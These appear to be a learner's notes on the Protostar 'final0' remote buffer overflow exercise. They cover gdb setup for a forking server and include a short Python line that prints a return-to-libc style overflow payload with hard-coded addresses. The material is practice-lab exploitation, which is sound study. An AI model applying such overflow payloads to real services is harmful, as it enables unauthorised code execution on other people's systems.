

killall final0
gdb ./final0

(gdb) set follow-fork-mode child
(gdb) set disassembly-flavor intel
(gdb) run
...
We cannot use CTRL+C in gdb. But we can do this from another root terminal:
$ kill -s TRAP <child pid>

After system() is executed (successful payload), in order to restore the image of the binary that is debugged:
(gdb) file /opt/protostar/bin/final0


root@protostar: gdb
(gdb) attach <final0's child-pid>
This did not work (but should on modern systems)

In case that you want to test the exploit locally, you can:
`print(payload)` which will result in `bytearray(b'\x00AAA...AAA\xb0\xff\xec\xb7BBBB\xbfc\xfb\xb7\n')` and then create the following solution.py

```python
print(bytearray(b'\x00AAA...AAA\xb0\xff\xec\xb7BBBB\xbfc\xfb\xb7\n'))
```
and just run the vulnerable program locally with this payload.

The payload is what we construct remotely.

This is our first remote buffer overflow.
